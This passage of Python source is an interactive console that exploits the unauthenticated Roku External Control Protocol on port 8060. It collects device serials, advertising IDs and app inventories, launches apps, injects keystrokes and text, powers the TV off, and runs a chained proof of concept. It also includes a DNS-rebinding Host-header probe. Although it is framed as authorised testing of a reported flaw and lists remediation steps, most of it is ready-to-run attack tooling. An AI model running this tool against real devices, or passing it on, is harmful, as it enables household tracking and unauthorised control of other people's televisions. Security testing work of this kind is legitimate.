    for line in body_lines[:70]:
        print("    " + c(line.rstrip(), ST_DIM))
    if len(body_lines) > 70:
        print("    " + c("... %d more lines (full body saved to %s/)"
                         % (len(body_lines) - 70, cli.capture_dir), ST_DIM))

    show_interpretation([
        "%d stable device identifiers disclosed with no credentials (%s)."
        % (len(sensitive), ", ".join(sensitive) or "none parsed"),
        "The advertising-id is a persistent cross-application tracker; the serial "
        "number is the identifier Roku support uses for account operations.",
        "Combined with the app inventory (menu option 2) this is enough for "
        "household profiling from a single unauthenticated GET.",
        "Capture saved under %s/." % cli.capture_dir,
    ])


def fetch_apps(cli: RokuClient, cfg) -> list:
    res = cli.apps_query(save_as="apps.xml",
                         note="unauthenticated GET /query/apps")
    if not res.ok:
        show_result(res)
        if res.error:
            warn("No response from %s:%d." % (cli.host, cli.port))
        return []
    apps = parse_apps(res.body)
    cli.apps = apps
    return apps


def act_apps(cli: RokuClient, cfg) -> None:
    print_header("Application inventory", "GET /query/apps   (unauthenticated)")
    res = cli.apps_query(save_as="apps.xml",
                         note="unauthenticated GET /query/apps")
    show_result(res, "full installed application list")
    if not res.ok:
        return
    apps = parse_apps(res.body)
    cli.apps = apps
    if not apps:
        warn("No <app> entries parsed; raw body may be empty or in an unexpected form.")
        return
    print()
    print_section("%d installed applications" % len(apps))
    kv("#", "%-14s %-24s %s" % ("APP ID", "NAME", "VERSION"), pad=4)
    for idx, (app_id, name, version, _typ) in enumerate(apps, 1):
        marker = c("*", ST_MAGENTA) if app_id in ("tvinput.hdmi1", "tvinput.hdmi2") else " "
        print("    %s %s %s %s %s" % (
            c("%2d" % idx, ST_DIM), marker,
            ("%-14s" % app_id[:14]), ("%-24s" % name[:24]), c(version, ST_DIM)))
    print()
    note("HDMI/AV/tuner entries marked * are TV inputs, not streaming channels.")
    note("Inventory reveals which services the household subscribes to; launch "
         "with menu option 3.")


def act_launch(cli: RokuClient, cfg) -> None:
    print_header("Launch application", "POST /launch/<appId>   (state-changing)")
    if not cli.apps:
        print("  " + c("fetching app inventory first ...", ST_DIM))
        fetch_apps(cli, cfg)
    if cli.apps:
        print()
        for idx, (app_id, name, version, _t) in enumerate(cli.apps, 1):
            print("    %s  %s %s" % (c("%2d" % idx, ST_DIM),
                                     ("%-14s" % app_id[:14]), name[:40]))
    print()
    choice = ask("app # or app id (blank = cancel, 837 = YouTube): ")
    if not choice:
        note("cancelled")
        return
    app_id = choice
    if choice.isdigit() and cli.apps and 1 <= int(choice) <= len(cli.apps):
        app_id = cli.apps[int(choice) - 1][0]
    name = next((n for i, n, _v, _t in cli.apps if i == app_id), "app %s" % app_id)

    print()
    res = cli.launch(app_id)
    show_result(res, "%s launched on the TV" % name if res.ok
                else "launch rejected (see status)")
    show_interpretation(
        ["HTTP 200 means the TV switched to %s with no authentication and no "
         "confirmation on the remote." % name,
         "App ids are stable across devices; tvinput.* ids switch inputs, and any "
         "id from the inventory works."] if res.ok else
        ["HTTP %s - launch did not complete." % res.status])


KEY_GROUPS = [
    ("Navigation", ["Up", "Down", "Left", "Right", "Select", "Back", "Home",
                    "Info", "Backspace", "Enter", "Search"]),
    ("Playback / channels", ["Play", "Rev", "Fwd", "InstantReplay",
                             "ChannelUp", "ChannelDown"]),
    ("Volume", ["VolumeUp", "VolumeDown", "VolumeMute"]),
    ("Inputs", ["InputTuner", "InputHDMI1", "InputHDMI2", "InputHDMI3",
                "InputHDMI4", "InputAV1", "InputComposite1"]),
    ("Power / remote", ["PowerOff", "Power", "FindRemote", "HeadlessPowerOn"]),
]

DANGEROUS_KEYS = {"PowerOff": "This powers the TV off (availability impact to viewing).",
                  "Power": "This toggles power on Roku TVs.",
                  "HeadlessPowerOn": "This wakes the device while the panel is off."}


def pick_key() -> str:
    print()
    flat = []
    for group, keys in KEY_GROUPS:
        print("    " + c(group, ST_CYAN))
        row = []
        for key in keys:
            flat.append(key)
            row.append(c("%2d" % len(flat), ST_DIM) + " " + ("%-15s" % key))
        for i in range(0, len(row), 3):
            print("       " + "".join(row[i:i + 3]))
        print()
    choice = ask("key # or key name (blank = cancel): ")
    if not choice:
        return ""
    if choice.isdigit() and 1 <= int(choice) <= len(flat):
        return flat[int(choice) - 1]
    return choice


def act_keypress(cli: RokuClient, cfg) -> None:
    print_header("Key injection", "POST /keypress/<key>   (state-changing)")
    key = pick_key()
    if not key:
        note("cancelled")
        return
    if key in DANGEROUS_KEYS and not confirm("%s: %s Continue?" % (key, DANGEROUS_KEYS[key])):
        note("cancelled")
        return
    res = cli.keypress(key)
    show_result(res, "keystroke %s accepted" % key if res.ok else "keystroke rejected")
    if res.ok:
        note("HTTP 200 = injected. Nothing on the TV distinguishes this from the "
             "physical remote.")


def act_keydown(cli: RokuClient, cfg) -> None:
    print_header("Key hold (keydown / keyup)", "POST /keydown/<key> then /keyup/<key>")
    key = pick_key()
    if not key:
        note("cancelled")
        return
    raw = ask("hold duration in seconds [1.0]: ")
    try:
        hold = float(raw) if raw else 1.0
    except ValueError:
        hold = 1.0
    hold = max(0.05, min(hold, 10.0))
    print()
    res = cli.keydown(key)
    show_result(res, "keydown %s accepted" % key if res.ok else "keydown rejected")
    if not res.ok:
        return
    print("  " + c("holding %.2fs ..." % hold, ST_DIM))
    time.sleep(hold)
    res2 = cli.keyup(key)
    print()
    show_result(res2, "keyup %s accepted" % key if res2.ok else "keyup rejected")
    note("Repeating keydown without keyup leaves the key logically held; a "
         "keydown/keyup pair is a long press (seek, fast scroll, etc.).")


def act_text(cli: RokuClient, cfg) -> None:
    print_header("Literal text entry", "POST /keypress/Lit_<char>   (per character)")
    text = ask("text to type into the focused field: ")
    if not text:
        note("cancelled")
        return
    print()
    ok = 0
    failed = []
    for ch in text:
        path = "/keypress/Lit_%s" % urllib.parse.quote(ch, safe="")
        res = cli.request(path, method="POST")
        if res.ok:
            ok += 1
        else:
            failed.append((ch, res.status))
        time.sleep(0.04)
    print("  %s %d/%d characters accepted" % (c("HTTP", ST_WHITE), ok, len(text)))
    if failed:
        warn("rejected: " + ", ".join("%r(%s)" % (ch, st) for ch, st in failed[:8]))
    note("Literal keys only reach an on-screen text field; nothing is echoed back "
         "by ECP.")


def act_power(cli: RokuClient, cfg) -> None:
    print_header("Power off device", "POST /keypress/PowerOff   (availability impact)")
    warn("This turns the TV off. On Roku TVs with Fast TV Start enabled the device "
         "stays reachable on 8060 while 'off'.")
    if not confirm("Power off the device at %s?" % cli.host):
        note("cancelled")
        return
    res = cli.keypress("PowerOff")
    show_result(res, "PowerOff accepted" if res.ok else "PowerOff rejected")
    if res.ok:
        note("Device should now be off; verify with option 10 if Fast TV Start "
             "keeps the ECP listener alive.")


def act_port_check(cli: RokuClient, cfg) -> None:
    print_header("Port 8060 reachability", "TCP connect + HTTP banner")
    note("8060 is absent from nmap's default top-1000 list, so a default scan "
         "under-reports this exposure.")
    print()
    print("  " + c("socket.create_connection(%s:%d, timeout=4)" % (cli.host, cli.port), ST_DIM))
    t0 = time.monotonic()
    try:
        sock = socket.create_connection((cli.host, cli.port), timeout=4.0)
        sock.close()
        print("    %s open  %s" % (c("8060/tcp", ST_GREEN),
                                   c("%.0f ms" % ((time.monotonic() - t0) * 1000.0), ST_DIM)))
    except Exception as exc:                                   # noqa: BLE001
        print("    %s %s" % (c("8060/tcp closed/filtered", ST_RED), exc))
        return

    res = cli.device_info(timeout=4.0)
    server = res.headers.get("Server", "") or res.headers.get("server", "")
    print()
    print_section("Application-layer confirmation")
    show_result(res, "Server: %s" % (server or "unknown"))
    if server and SERVER_BANNER_EXPECTED in server:
        print()
        n = note
        n("Banner matches a Roku ECP listener (%s)." % server)
        n("ECP is reachable, unauthenticated, and answers XML on /query/device-info.")
    elif res.ok:
        note("Port answers HTTP but the Server banner is not the expected Roku one; "
             "verify this is really ECP before testing further.")
    else:
        warn("Port is open but ECP did not answer normally (status %s)." % res.status)


def act_install(cli: RokuClient, cfg) -> None:
    print_header("App install attempt (negative control)", "POST /install/<appId>")
    note("The report observed HTTP 401 here because developer mode is off. A 200 "
         "would mean arbitrary app installation - and possible code execution.")
    app_id = ask("app id to install [837]: ") or REPORT_APP_YOUTUBE
    print()
    res = cli.install(app_id)
    show_result(res, "install of app %s" % app_id)
    if res.status == 401:
        show_interpretation([
            "HTTP 401 confirms the install endpoint is gated: developer mode is "
            "disabled, so code execution was not demonstrated.",
            "Impact stays at UI/media control plus information disclosure, matching "
            "the reported 7.6 score.",
        ])
    elif res.ok:
        warn("HTTP 200 - install was accepted! Developer mode may be enabled; the "
             "finding's severity conditions say this raises integrity/confidentiality "
             "to High and likely makes the issue Critical.")
    else:
        bullet("HTTP %s - endpoint responded but not as the documented control."
               % res.status)


def act_host_header(cli: RokuClient, cfg) -> None:
    print_header("Host header / DNS-rebinding check", "GET /query/device-info with two Host values")
    good = "%s:%d" % (cli.host, cli.port)
    print()
    print("  " + c("control   Host: %s" % good, ST_DIM))
    r1 = cli.request("/query/device-info", host_header=good)
    show_result(r1)
    print()
    print("  " + c("adversarial Host: evil.attacker.test", ST_DIM))
    r2 = cli.request("/query/device-info", host_header="evil.attacker.test")
    show_result(r2)

    print()
    print_section("Verdict")
    if r1.status == 200 and r2.status in (400, 403):
        bullet("Device validates the Host header (200 vs %s): browser-based DNS "
               "rebinding is mitigated." % r2.status)
        bullet("Precondition for abuse is therefore direct LAN reach, i.e. "
               "AV:Adjacent - not a victim merely visiting a web page.")
    elif r1.status == 200 and r2.status == 200:
        warn("Both Host values returned 200: the Host header is ignored. A malicious "
             "page could reach the TV via DNS rebinding, which would raise the attack "
             "vector to Network.")
    else:
        bullet("Inconclusive (control=%s, adversarial=%s). Re-run when the device is "
               "stable." % (r1.status, r2.status))
    note("No credentials are sent in either request.")


def act_supplemental(cli: RokuClient, cfg) -> None:
    while True:
        print_header("Supplemental ECP queries", "standard ECP endpoints, outside the finding")
        print("    1  Active app            GET /query/active-app")
        print("    2  Media player state    GET /query/media-player")
        print("    3  TV channels           GET /query/tv-channels")
        print("    4  Active TV channel     GET /query/tv-active-channel")
        print("    5  App icon              GET /query/icon/<appId>")
        print("    0  back")
        print()
        choice = ask("select: ")
        if choice in ("0", "", "b", "back"):
            return
        if choice == "1":
            res = cli.request("/query/active-app")
            print()
            show_result(res)
            if res.ok:
                name = xml_field(res.body, "app")
                if not name:
                    m = re.search(r"<app[^>]*>(.*?)</app>", res.body, re.S)
                    name = m.group(1).strip() if m else res.body.strip()[:80]
                kv("Active app", name or "(unknown)")
                show_interpretation(["Unauthenticated read of what is on screen right "
                                     "now - useful for confirming injected launches."])
        elif choice == "2":
            res = cli.request("/query/media-player")
            print()
            show_result(res)
            for tag in ("state", "error", "format", "position", "duration",
                        "is_live", "buffering"):
                val = xml_field(res.body, tag)
                if val:
                    kv(tag, val)
        elif choice == "3":
            res = cli.request("/query/tv-channels")
            print()
            show_result(res)
            chans = re.findall(r"<channel[^>]*>(.*?)</channel>", res.body, re.S)
            kv("Channels", str(len(chans)) if chans else "none parsed")
            for ch in chans[:10]:
                bullet(ch.strip()[:60])
        elif choice == "4":
            res = cli.request("/query/tv-active-channel")
            print()
            show_result(res)
            for tag in ("number", "name", "type", "program-title", "program-description"):
                val = xml_field(res.body, tag)
                if val:
                    kv(tag, val)
        elif choice == "5":
            if not cli.apps:
                fetch_apps(cli, cfg)
            app_id = ask("app id [837]: ") or REPORT_APP_YOUTUBE
            res = cli.request("/query/icon/%s" % app_id)
            print()
            show_result(res)
            if res.ok:
                path = os.path.join(cli.capture_dir, "icon_%s.png" % re.sub(r"\W", "_", app_id))
                try:
                    raw = urllib.request.urlopen(cli.base_url + "/query/icon/" + app_id,
                                                 timeout=6.0).read()
                    with open(path, "wb") as fh:
                        fh.write(raw)
                    kv("Saved", "%s (%d bytes)" % (path, len(raw)))
                except Exception as exc:                       # noqa: BLE001
                    warn("icon download failed: %s" % exc)
        else:
            continue
        print()


def act_full_chain(cli: RokuClient, cfg) -> None:
    print_header("Full PoC chain (report reproduction steps 2-5)",
                 "device-info -> apps -> keypress Home -> launch 837 -> install 837")
    warn("This changes TV state: Home is pressed and YouTube is launched.")
    if not confirm("Run the state-changing chain against %s?" % cli.host):
        note("cancelled")
        return

    print()
    res = cli.device_info(save_as="chain_device-info.xml")
    print("  [1] %s  GET  /query/device-info" % status_text(res.status, res.error), end="")
    if res.ok:
        print("   serial=%s model=%s" % (xml_field(res.body, "serial-number") or "?",
                                        xml_field(res.body, "model-name") or "?"))
        for tag in ("software-version", "network-name", "advertising-id",
                    "wifi-mac", "ethernet-mac"):
            val = xml_field(res.body, tag)
            if val:
                print("      %-18s %s" % (tag + ":", val))
    else:
        print()

    res = cli.apps_query(save_as="chain_apps.xml")
    apps = parse_apps(res.body) if res.ok else []
    cli.apps = apps or cli.apps
    print("  [2] %s  GET  /query/apps" % status_text(res.status, res.error), end="")
    print("   %d apps" % len(apps) if apps else "")
    for app_id, name, version, _t in apps[:10]:
        print("      [%8s] %-22s %s" % (app_id, name, version))
    if len(apps) > 10:
        print("      " + c("... %d more" % (len(apps) - 10), ST_DIM))

    res = cli.keypress("Home")
    print("  [3] %s  POST /keypress/Home" % status_text(res.status, res.error))
    if res.ok:
        print("      " + c("TV navigates Home", ST_DIM))

    res = cli.launch(REPORT_APP_YOUTUBE)
    print("  [4] %s  POST /launch/837 (YouTube)" % status_text(res.status, res.error))
    if res.ok:
        print("      " + c("app launches on TV", ST_DIM))

    res = cli.install(REPORT_APP_YOUTUBE)
    print("  [5] %s  POST /install/837 (negative control)" % status_text(res.status, res.error))
    if res.status == 401:
        print("      " + c("developer mode gated - code execution not achieved", ST_DIM))

    print()
    note("Every operation above required no authentication, pairing or user action.")


def act_remediation(cli: RokuClient, cfg) -> None:
    print_header("Remediation checklist", "from the finding's remediation section")
    for i, item in enumerate(REMEDIATION, 1):
        print("    %s %s" % (c("%d." % i, ST_CYAN), item))
        print()
    note("Severity falls to negligible with ECP disabled or the device moved to an "
         "isolated VLAN with inter-VLAN filtering.")


def act_settings(cli: RokuClient, cfg) -> None:
    print_header("Target and console settings", "")
    kv("Target", "%s:%d" % (cli.host, cli.port))
    kv("Animations", "on, %.2fs" % cfg.anim_seconds if cfg.animations else "off")
    kv("Render mode", "ascii" if cfg.ascii_mode else ("truecolor" if cfg.truecolor else "256-colour"))
    kv("Captures", os.path.abspath(cli.capture_dir))
    kv("Session log", os.path.abspath(cli.log_path) if cli.log_path else "(disabled)")
    print()
    print("    1  Change target host / port")
    print("    2  Toggle animations")
    print("    3  Set animation duration")
    print("    4  Pause before menu redraw (readable output)")
    print("    0  back")
    print()
    choice = ask("select: ")
    if choice == "1":
        host = ask("target host or IP [%s]: " % cli.host) or cli.host
        raw_port = ask("port [%d]: " % cli.port)
        port = cli.port
        if raw_port.isdigit():
            port = int(raw_port)
        cli.set_target(host, port)
        note("target set to %s:%d" % (cli.host, cli.port))
    elif choice == "2":
        cfg.animations = not cfg.animations
        note("animations %s" % ("on" if cfg.animations else "off"))
    elif choice == "3":
        raw = ask("seconds [%.1f]: " % cfg.anim_seconds)
        try:
            cfg.anim_seconds = max(0.0, min(float(raw), 30.0))
        except ValueError:
            pass
        note("animation duration %.2fs" % cfg.anim_seconds)
    elif choice == "4":
        cfg.pause_after = not cfg.pause_after
        note("pause %s" % ("on" if cfg.pause_after else "off"))


def act_summary(cli: RokuClient, cfg) -> None:
    print_header("Session summary", "")
    total = len(cli.history)
    ok = sum(1 for r in cli.history if r.status == 200)
    denied = sum(1 for r in cli.history if r.status in (401, 403))
    failed = sum(1 for r in cli.history if not r.status or r.error)
    other = total - ok - denied - failed
    kv("Requests", str(total))
    kv("HTTP 200", str(ok))
    kv("HTTP 401 / 403", str(denied))
    if other:
        kv("Other status", str(other))
    if failed:
        kv("Transport errors", str(failed))
    if cli.history:
        print()
        print_section("Last 12 requests")
        for res in cli.history[-12:]:
            print("    %s %-32s %s" % (res.method.ljust(4), res.path[:32],
                                       status_text(res.status, res.error)))
    print()
    kv("Session log", os.path.abspath(cli.log_path) if cli.log_path else "-")
    kv("Captures", os.path.abspath(cli.capture_dir))
    if cli.apps:
        kv("Apps cached", str(len(cli.apps)))


# ---------------------------------------------------------------------------
# Menu rendering / loop
# ---------------------------------------------------------------------------

MENU = [
    ("RECON / INFORMATION DISCLOSURE", [
        ("1", "Device information", "GET  /query/device-info", act_device_info),
        ("2", "App inventory", "GET  /query/apps", act_apps),
    ]),
    ("CONTROL / INJECTION  (state-changing)", [
        ("3", "Launch an application", "POST /launch/<appId>", act_launch),
        ("4", "Inject a keystroke", "POST /keypress/<key>", act_keypress),
        ("5", "Hold a key (down/up)", "POST /keydown,/keyup/<key>", act_keydown),
        ("6", "Type literal text", "POST /keypress/Lit_<char>", act_text),
        ("7", "Power the device off", "POST /keypress/PowerOff", act_power),
    ]),
    ("VALIDATION / TESTS", [
        ("8", "Full PoC chain (report steps 2-5)", "", act_full_chain),
        ("9", "Host-header / rebinding check", "200 vs 403", act_host_header),
        ("10", "Port 8060 reachability", "TCP + Server banner", act_port_check),
        ("11", "App install attempt (401 control)", "POST /install/<appId>", act_install),
        ("12", "Supplemental ECP queries", "active-app, media-player, ...", act_supplemental),
    ]),
    ("SESSION", [
        ("13", "Target / animation settings", "", act_settings),
        ("14", "Remediation checklist", "", act_remediation),
        ("15", "Session log summary", "", act_summary),
        ("0", "Quit", "", None),
    ]),
]


def draw_menu(cli: RokuClient, cfg) -> None:
    cols, _rows = _terminal_size()
    width = min(78, max(60, cols - 2))
    print(CLEAR)
    title = "  ROKU ECP CONTROL CONSOLE  "
    sub = "unauthenticated ECP - TCP%5d" % cli.port
    print(c("\u250c" + "\u2500" * (width - 2) + "\u2510", ST_MAGENTA) if _GLYPHS
          else c("+" + "-" * (width - 2) + "+", ST_MAGENTA))
    print(c("\u2502", ST_MAGENTA) + c(title.ljust(width - 2 - len(sub) - 1), ST_MAGENTA + ";1")
          + c(sub + " ", ST_DIM) + c("\u2502", ST_MAGENTA))
    print(c("\u2514" + "\u2500" * (width - 2) + "\u2518", ST_MAGENTA) if _GLYPHS
          else c("+" + "-" * (width - 2) + "+", ST_MAGENTA))

    anim_state = "animations %s" % ("%.1fs" % cfg.anim_seconds if cfg.animations else "off")
    mode = "ascii" if cfg.ascii_mode else ("truecolor" if cfg.truecolor else "256c")
    print("  %s %s   %s %s   %s" % (
        c("target", ST_DIM), c("%s:%d" % (cli.host, cli.port), ST_WHITE),
        c("mode", ST_DIM), c(mode, ST_WHITE),
        c(anim_state, ST_DIM)))

    if cfg.last_output:
        lines = cfg.last_output[:9]
        print()
        print("  " + c("last result", ST_DIM) + c(" " + "\u2500" * (width - 16), ST_DIM))
        usable = width - 8
        for line in lines:
            plain = strip_ansi(line)
            if len(plain) > usable:
                plain = plain[:usable - 1] + "\u2026"
            print("  " + c("\u2502 ", ST_DIM) + c(plain, ST_WHITE))
        if len(cfg.last_output) > len(lines):
            print("  " + c("\u2502 ", ST_DIM) + c("...", ST_DIM))

    for section, items in MENU:
        print()
        print("  " + c("\u2500 " + section + " ", ST_BLUE))
        for key, label, endpoint, _fn in items:
            left = "   %-3s %-36s" % (key, label)
            print("  " + c(left, ST_WHITE if key != "0" else ST_DIM)
                  + c(endpoint, ST_DIM))
    print()


def main_menu(cli: RokuClient, cfg) -> None:
    handlers = {}
    for _section, items in MENU:
        for key, _label, _endpoint, fn in items:
            handlers[key] = fn

    while True:
        draw_menu(cli, cfg)
        choice = ask("select> ")
        if not choice:
            continue
        if choice.lower() in ("q", "quit", "exit", "0"):
            break
        fn = handlers.get(choice)
        if fn is None:
            if choice.isdigit():
                continue
            warn("unknown selection: %s" % choice)
            time.sleep(0.6)
            continue

        # 3-second psychedelic transition for the interval between selections
        play_animation(cfg)

        buffer = io.StringIO()
        real_stdout = sys.stdout

        class _Tee(io.TextIOBase):
            def write(self, s):
                buffer.write(s)
                return (real_stdout.write(s) or len(s))

            def flush(self):
                real_stdout.flush()

        sys.stdout = _Tee()
        try:
            fn(cli, cfg)
        except KeyboardInterrupt:
            print("\n  " + c("interrupted", ST_YELLOW))
        except Exception as exc:                                # noqa: BLE001
            print("\n  " + c("action failed: %s: %s" % (type(exc).__name__, exc), ST_RED))
        finally:
            sys.stdout = real_stdout

        kept = []
        for line in buffer.getvalue().splitlines():
            plain = strip_ansi(line).rstrip()
            if not plain:
                kept.append("")
            elif plain.endswith(":"):      # interactive prompt: not a result
                continue
            else:
                kept.append(plain)
        cfg.last_output = kept

        if cfg.pause_after:
            ask("press Enter to return to the menu ...")
        else:
            time.sleep(0.9)


# ---------------------------------------------------------------------------
# Config + entry point
# ---------------------------------------------------------------------------

@dataclass
class Config:
    animations: bool = True
    anim_seconds: float = DEFAULT_ANIM_SECONDS
    ascii_mode: bool = False
    truecolor: bool = True
    pause_after: bool = False
    last_animation: str = ""
    last_output: list = field(default_factory=list)
    rng: random.Random = field(default_factory=lambda: random.Random())


INTRO = r"""
   ____   ___  _  ___   _   _____ ____   ____ ___  _   _ ____  _____ _     _____
  |  _ \ / _ \| |/ / | | | | ____/ ___| / ___/ _ \| \ | / ___||  ___| |   | ____|
  | |_) | | | | ' /| | | | |  _| |    | |  | | | |  \| \___ \| |_  | |   |  _|
  |  _ <| |_| | . \| |_| | |___| |___ | |__| |_| | |\  |___) |  _| | |___| |___
  |_| \_\\___/|_|\_\\___/|_____|\____| \____\___/|_| \_|____/|_|   |_____|_____|
"""


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Menu console for unauthenticated Roku ECP (TCP/8060) testing.")
    parser.add_argument("target", nargs="?", default=DEFAULT_TARGET,
                        help="Roku device IP or hostname (default: %s)" % DEFAULT_TARGET)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT,
                        help="ECP port (default: %d)" % DEFAULT_PORT)
    parser.add_argument("--anim-seconds", type=float, default=DEFAULT_ANIM_SECONDS,
                        help="length of each transition animation (default 3.0)")
    parser.add_argument("--no-anim", action="store_true", help="disable animations")
    parser.add_argument("--256", dest="col256", action="store_true",
                        help="force xterm-256 colours instead of truecolor")
    parser.add_argument("--ascii", action="store_true",
                        help="force ASCII glyphs (no Unicode half blocks)")
    parser.add_argument("--pause", action="store_true",
                        help="wait for Enter after each action before redrawing")
    parser.add_argument("--force-anim", action="store_true",
                        help="animate even when stdout is not a TTY")
    return parser.parse_args(argv)


def main(argv=None) -> int:
    args = parse_args(argv)
    enable_windows_ansi()

    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

    glyphs, truecolor = detect_capabilities(args.ascii, args.col256, False)

    cfg = Config(
        animations=not args.no_anim,
        anim_seconds=args.anim_seconds,
        ascii_mode=args.ascii or not glyphs,
        truecolor=truecolor,
        pause_after=args.pause,
    )
    if not sys.stdout.isatty() and not args.force_anim:
        cfg.animations = False

    cli = RokuClient(args.target, args.port)

    print(c(INTRO, ST_MAGENTA))
    print("  " + c("Unauthenticated Roku ECP console - authorised testing only", ST_DIM))
    print("  " + c("Target: %s   ECP: http://%s:%d" % (args.target, args.target, args.port),
                   ST_WHITE))
    if not cfg.animations:
        print("  " + c("animations disabled (non-TTY or --no-anim)", ST_DIM))
    print()
    print("  " + c("The finding this console exercises:", ST_DIM))
    print("  " + c("CWE-306 - missing authentication on TCP/8060 - CVSS 3.1 7.6 "
                   "(AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L)", ST_DIM))
    time.sleep(1.0 if cfg.animations else 0.0)

    try:
        main_menu(cli, cfg)
    except KeyboardInterrupt:
        pass

    print(CLEAR)
    print(c("  session closed", ST_MAGENTA))
    captures = len(os.listdir(cli.capture_dir)) if os.path.isdir(cli.capture_dir) else 0
    print("  %s %d requests, %d capture files, log: %s" % (
        c("\u00b7", ST_DIM), len(cli.history), captures, cli.log_path or "-"))
    print()
    return 0


if __name__ == "__main__":
    sys.exit(main())
